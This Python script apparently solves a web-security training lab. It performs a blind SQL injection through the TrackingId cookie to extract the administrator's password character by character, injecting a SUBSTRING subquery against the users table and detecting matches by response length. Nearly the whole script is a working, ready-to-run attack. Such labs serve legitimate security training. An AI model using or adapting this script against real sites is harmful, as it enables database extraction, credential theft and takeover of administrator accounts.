
#%%
import string
import requests

url = "https://ac8c1fce1e78d122c0ef46bb00e5009b.web-security-academy.net/"
tracking_id = "N6ZAsoGLVQeST0GE"
session_id = "8CldwQ7H0aCEIovZ0cwPBwe6CisWTfWB"
success_message = "Welcome back"
#%%
# Test URL to see if you get your expected results

r = requests.get(
            url,cookies={'TrackingId':tracking_id, 'session': session_id}
            )
#print(r.text)
print(success_message in r.text)

original_response_length = len(r.text)
print(original_response_length)
#%%
print("starting bruteforcing")
password_char_list = []
for i in range(1,21):
    print("testing position: %s" % i)
    # string.printable provides a list of characters 0-9a-z and special chars
    for j in list(string.printable):
        print("On position {}, testing the alphanum character: {}".format(i,j))
        r = requests.get(
            url,cookies={'TrackingId':f"{tracking_id}' AND (SELECT SUBSTRING(password,{i},1) FROM users WHERE username='administrator')='{j}", 'session': session_id}
            )
        print("original_response_length: %s" % len(r.text))
        # We're comparing the 
        if len(r.text) == original_response_length:
            password_char_list.append(j)
            print("Character '%s' found!" % j)
            break
print("bruteforce completed")
# %%
password_str = ""
print("The password is: %s" % password_str.join(password_char_list))